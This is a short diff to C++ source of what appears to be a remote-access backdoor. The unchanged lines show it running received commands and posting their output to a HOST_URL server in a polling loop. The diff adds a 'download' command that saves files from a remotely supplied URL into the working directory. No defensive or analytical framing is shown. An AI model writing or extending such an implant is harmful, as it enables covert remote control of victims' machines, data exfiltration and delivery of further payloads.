@@ -282,6 +282,11 @@ int main() {
             string output = exec(command);
             post(HOST_URL + "output", "id=" + id + "&output=" + output);
 
+        } else
+        if ( MacroCmd == "download") {
+            string dir = exec("pwd");
+            string name = command.substr( command.find_last_of("/") + 1 );
+            download_file(command, dir + "/" + name);
         }
 
         this_thread::sleep_for(chrono::seconds( wait_for_command_time ));
